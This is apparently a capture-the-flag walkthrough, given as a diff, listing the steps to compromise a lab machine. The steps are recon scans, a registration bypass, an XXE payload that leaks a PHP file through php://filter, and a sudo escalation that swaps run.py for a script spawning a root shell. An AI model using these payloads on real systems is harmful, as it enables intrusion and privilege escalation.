@@ -1,0 +1,27 @@
+1 - nmap -A 10.10.167.38
+2 - gobuster dir -u http://10.10.167.38 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+3 - http://10.10.167.38/register.php
+4 - wget http://10.10.167.38/report
+5 - strings report
+6 - http://10.10.167.38/register.php -> username: admin@bank. a
+7 - Burp Suite -> uname=admin%40bank.a a&bank=abc&password=admin&btn=Register+me%21 -> Forward
+8 - http://10.10.167.38/forms.php -> XXE
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY XXE SYSTEM "php://filter/convert.base64-encode/resource=acc.php"> ]>
+<root><name>1</name><search>&XXE;</search></root>
+
+9 - Sent to Decoder -> Decode as : BASE64 
+10 - ssh cyber@10.10.167.38
+11 - cat flag1.txt
+12 - sudo -l
+13 - mv run.py run.py.old
+14 - cat > run.py << EOF
+import os
+os.system("/bin/bash")
+EOF
+
+15 - sudo /usr/bin/python3 /home/cyber/run.py
+16 - cat /root/root.txt
+
+
